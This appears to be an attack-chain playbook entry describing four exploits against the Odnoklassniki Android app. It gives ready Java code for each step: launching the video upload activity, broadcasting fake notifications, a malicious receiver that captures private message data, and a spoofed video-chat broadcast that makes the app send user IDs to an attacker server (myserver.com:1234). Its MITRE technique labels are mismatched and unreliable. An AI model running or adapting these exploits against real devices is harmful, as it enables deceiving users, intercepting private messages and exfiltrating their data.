---
tags:
  - android
  - intent-spoofing
  - privilege-escalation
  - notifications
  - data-exfiltration
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
  - '[[Command and Control]]'
verified: false
platforms:
  - Android
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Intent-Spoofing-for-Video-Upload]]'
  - '[[procedures/Send-Fake-Notifications-via-Intent-Spoofing]]'
  - '[[procedures/Intercept-Unauthorized-Notifications]]'
  - '[[procedures/Privilege-Redelegation-for-Arbitrary-HTTP-Requests]]'
step_count: 4
techniques:
  - '[[T1417]]'
  - '[[Cloud Service Discovery]]'
updated_at: '2025-12-14T17:24:42.390Z'
description: >-
  A multi-stage attack exploiting vulnerabilities in the Odnoklassniki Android
  app to spoof intents, intercept notifications, and redelegate privileges for
  data exfiltration.
skill_level: intermediate
impact_level: high
id: d242772c-d57a-4405-8b11-92a1eba0bac3
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
  - '[[Command and Control]]'
mitre_techniques:
  - '[[T1417]]'
  - '[[Cloud Service Discovery]]'
---
# Multiple Intent Spoofing and Privilege Escalation in Odnoklassniki Android App

Multi-stage attack chain demonstrating exploits in the Odnoklassniki (ok.ru) Android application, including intent spoofing in video upload and notification components, unauthorized receipt of notifications, and privilege redelegation in the video chat controller. These vulnerabilities allow a malicious app to trick users, intercept sensitive data, and exfiltrate information to attacker-controlled servers without requiring the INTERNET permission.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Malicious App] --> B[Spoof Video Upload Intent]
    B --> C[Send Fake Notifications]
    C --> D[Intercept Sensitive Notifications]
    D --> E[Redelegate Privileges for HTTP Exfiltration]
    E --> F[Data Leaked to Attacker Server]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Android development environment (e.g., Android Studio for building malicious app)
- Decompiler (e.g., APKTool or Jadx) for analyzing Odnoklassniki app

### Target Environment

- Android OS
- Odnoklassniki app installed (package: ru.ok.android)
- Malicious app with ability to send intents and register receivers

### Initial Access Requirements

- User installs malicious app (e.g., via sideloading or app store)
- No special credentials needed; exploits public components
- Same device as target app

## Detailed Attack Procedures

### Step 1: Exploit Intent Spoofing for Video Upload
procedure: [[procedures/Exploit-Intent-Spoofing-for-Video-Upload]]

**Objective**: Trick the user into uploading unintended videos to ok.ru by launching the public video upload activity.

**Instructions**: In the malicious app, create and send an explicit intent to start the StartVideoUploadActivity. Use [[commands/start-video-upload-intent]] to initiate:

```java
Intent m = new Intent(); m.setClassName("ru.ok.android","ru.ok.android.ui.activity.StartVideoUploadActivity"); startActivity(m);
```

**Expected Output**: The video upload activity launches, prompting the user to select and upload content.

**Success Indicators**:
- Video upload screen appears
- User interacts and uploads file

### Step 2: Send Fake Notifications via Intent Spoofing
procedure: [[procedures/Send-Fake-Notifications-via-Intent-Spoofing]]

**Objective**: Impersonate real notifications to mislead the user into actions like responding to fake messages or comments.

**Instructions**: Broadcast a fake intent to the NotifyReceiver with spoofed extras. Execute [[commands/send-fake-notification-intent]]:

```java
Intent u = new Intent(); u.setAction("ru.ok.android.action.NOTIFY"); u.putExtra("key", "d-147298617"); u.putExtra("message", "Hello there! This is a fake message. You have been tricked."); u.putExtra("dsc_id", "612470493988:USER_PHOTO"); getActivity().sendBroadcast(u);
```

**Expected Output**: A fake notification displays in the app or system tray, mimicking a real event.

**Success Indicators**:
- Notification appears to user
- User takes action based on fake content

### Step 3: Intercept Unauthorized Notifications
procedure: [[procedures/Intercept-Unauthorized-Notifications]]

**Objective**: Capture sensitive notification data, including messages, user IDs, and conversation details.

**Instructions**: Register a malicious BroadcastReceiver in the app to listen for notification intents. Implement using [[commands/implement-malicious-receiver]]:

```java
public class MaliciousReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if ("ru.ok.android.action.NOTIFY".equals(intent.getAction())) { Bundle localBundle = intent.getExtras(); if (localBundle != null) { String str1 = localBundle.getString("key"); String str2 = localBundle.getString("message"); String str3 = localBundle.getString("cid"); if (str3 != null) { String str4 = localBundle.getString("caller_name"); String str5 = localBundle.getString("server"); return; } String str4 = localBundle.getString("nconversation_id"); String str5 = localBundle.getString("dsc_id"); Toast.makeText(context, "key:" + str1 + "\nmessage: " + str2 + "\ncid: " + str3 + "\nconversation_id: " + str4 + "\ndsc_id: " + str5, Toast.LENGTH_SHORT).show(); } } } }
```

Register the receiver in the manifest or dynamically.

**Expected Output**: Toast or log shows intercepted data like message text and IDs.

**Success Indicators**:
- Receiver captures intent
- Sensitive data extracted and displayed

### Step 4: Privilege Redelegation for Arbitrary HTTP Requests
procedure: [[procedures/Privilege-Redelegation-for-Arbitrary-HTTP-Requests]]

**Objective**: Bypass INTERNET permission by injecting an attacker server into the video chat controller to exfiltrate data.

**Instructions**: Send a broadcast intent to trigger the video chat with a fake server address. Use [[commands/trigger-video-chat-redelegation]]:

```java
Intent m = new Intent(); m.setAction("ru.ok.android.action.NOTIFY"); m.putExtra("key", "vchat"); m.putExtra("cid", "c60b0e06695a4ce896261247b43f772b"); m.putExtra("caller_name", "Fake User"); m.putExtra("server", "myserver.com:1234"); getActivity().sendBroadcast(m);
```

**Expected Output**: Odnoklassniki app sends HTTP GET to the attacker server with params like uid and cid.

**Success Indicators**:
- HTTP request received on attacker server
- Device data exfiltrated

## Attack Chain Summary

### Key Achievements

1. Tricked user into unintended video uploads
2. Sent fake notifications to manipulate user behavior
3. Intercepted private messages and user data
4. Exfiltrated data via privilege redelegation without direct permissions

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[T1417]] Hijack Execution Flow
- [[Cloud Service Discovery]] Introduce Dependencies

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Collection]] Collection
- [[Command and Control]] Command and Control

---
*Last updated: 2023-10-01T00:00:00Z*
